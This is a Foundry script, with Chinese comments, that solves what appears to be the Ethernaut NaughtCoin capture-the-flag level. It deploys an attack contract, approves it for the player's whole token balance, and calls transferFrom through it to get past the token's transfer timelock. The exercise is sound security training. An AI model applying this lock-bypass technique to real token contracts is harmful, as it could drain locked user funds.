// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/NaughtCoinAttack.sol";

contract AttackNaughtCoinScript is Script {
    // 把你的 Ethernaut 實例地址填在這裡
    address naughtCoinAddress = vm.envAddress("INSTANCE_ADDRESS");

    function run() external {
        // 從環境變數讀取你的私鑰 (假設你在 .env 設定了 PRIVATE_KEY)
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(deployerPrivateKey);

        vm.startBroadcast(deployerPrivateKey);

        // 1. 部署攻擊合約
        NaughtCoinAttack attacker = new NaughtCoinAttack();
        
        // 2. 取得 NaughtCoin 介面
        INaughtCoin coin = INaughtCoin(naughtCoinAddress);
        uint256 balance = coin.balanceOf(player);

        // 3. 關鍵動作：玩家授權給「攻擊合約」
        // 這裡授權了攻擊合約可以動用玩家帳戶裡所有的 token
        console.log("Approving attacker contract...");
        coin.approve(address(attacker), balance);

        // 4. 呼叫攻擊合約的 attack 函式
        console.log("Executing attack via transferFrom...");
        attacker.attack(naughtCoinAddress, player);

        // 5. 檢查餘額是否歸零
        uint256 newBalance = coin.balanceOf(player);
        console.log("Player's new balance:", newBalance);

        vm.stopBroadcast();
    }
}
